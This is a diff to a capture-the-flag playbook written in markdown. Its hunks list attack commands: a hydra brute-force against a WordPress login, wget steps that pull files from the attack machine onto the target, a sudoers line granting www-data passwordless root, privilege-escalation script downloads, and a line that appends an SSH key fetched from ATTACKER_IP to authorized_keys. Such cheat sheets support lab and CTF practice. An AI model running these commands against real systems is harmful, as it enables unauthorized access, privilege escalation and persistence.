@@ -141,7 +141,7 @@ hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^U
 __Malicous File Upload__
 ```bash
 # location of kali linux malicious web shells 
-# 
+cd /user/share/webshells/
 ```
 
 * test common services pop3,ftp,ssh, smtp
@@ -165,6 +165,15 @@ __Upload Maliscous File__
 # Use the following techniques to upload malfiles such as php reverse shells
 
 # Upload via HTTP
+# Start a local web server
+service apache2 start 
+# change directories to webserver 
+cd /var/www/html
+# download files to webserver 
+wget https://some-website.com/path/to/file
+# download files from your webserver to your target 
+target$ wget [attack-machine-ip]/filename.extension
+
 # Upload via FTP
 # Upload via TFTP
 # Upload via SMB
@@ -172,7 +181,7 @@ __Upload Maliscous File__
 
 # Exploitation 
 Successful gain unauthorized access
-[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4)
+[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-4).  This step depends entirely on what type of exploit you decide to use. 
 
 # Reconnaissance 4
 Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
@@ -253,10 +262,14 @@ $ find / -perm -u=s -type f 2>/dev/null
 $ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
 
-__Automate Scripts__
-
+__Automated Priv Escalation  Scripts__
+Download these scripts to your target and run to search for any number of vulnerabilities  
 ```bash
+# The best script I've found by far 
+wget  https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
+
 wget https://github.com/pentestmonkey/unix-privesc-check
+
 ```
 
 __If You have a Reverse Shell...__
@@ -270,8 +283,6 @@ export SHELL=bash
 # Above but as one script 
 python -c 'import pty;pty.spawn("/bin/bash")'; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ; export TERM=xterm; export SHELL=bash
-
-
 
 #Add public key to authorized keys:
 $ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
@@ -338,6 +349,9 @@ find . -type f -exec grep "*flag*" '{}' \; -print
 find / -size -[flag size] 
 
 locate "*flag*"
+
+# locate "hidden" files 
+ls -a 
 ```
 
 # Celebration 
